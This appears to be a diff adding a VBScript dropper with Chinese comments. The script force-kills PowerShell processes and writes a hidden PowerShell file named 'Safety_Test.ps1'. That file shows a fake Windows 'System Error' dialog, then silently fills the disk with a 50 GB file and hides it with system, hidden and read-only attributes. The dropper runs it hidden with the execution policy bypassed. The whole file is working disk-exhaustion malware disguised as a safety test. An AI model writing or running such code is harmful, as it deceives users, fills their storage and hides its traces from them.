@@ -1,1 +1,33 @@
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set WshShell = CreateObject("WScript.Shell")
+
+' 1. 动态获取当前目录
+CurrentDir = fso.GetParentFolderName(WScript.ScriptFullName)
+psPath = CurrentDir & "\Safety_Test.ps1"
+
+' 2. 暴力清理旧文件锁
+WshShell.Run "taskkill /F /IM powershell.exe /T", 0, True
+On Error Resume Next
+WshShell.Run "attrib -s -h -r " & Chr(34) & psPath & Chr(34), 0, True
+fso.DeleteFile psPath, True
+On Error GoTo 0
+
+' 3. 写入内容（这里直接包含隐藏 bigfile 的命令）
+Set psFile = fso.CreateTextFile(psPath, True)
+psFile.WriteLine "$TargetDir = '" & CurrentDir & "'"
+psFile.WriteLine "$BigFile = Join-Path $TargetDir 'core_dump.txt'"
+psFile.WriteLine "Add-Type -AssemblyName PresentationFramework"
+psFile.WriteLine "[System.Windows.MessageBox]::Show('Windows Version Error: build 23H2 incompatible.', 'System Error', 0, 16)"
+psFile.WriteLine "$Stream = [System.IO.File]::OpenWrite($BigFile)"
+psFile.WriteLine "$Buffer = New-Object Byte[] 1048576"
+' 循环 51200 次 = 50GB
+psFile.WriteLine "for($i=1; $i -le 51200; $i++) { $Stream.Write($Buffer, 0, $Buffer.Length); Start-Sleep -Milliseconds 1 }"
+psFile.WriteLine "$Stream.Close()"
+' --- 关键：在这里隐藏 BigFile ---
+psFile.WriteLine "attrib +h +s +r $BigFile"
+psFile.Close
+
+' 4. 隐藏脚本自己并静默运行
+fso.GetFile(psPath).Attributes = 2 + 4
+WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & Chr(34) & psPath & Chr(34), 0, False
 
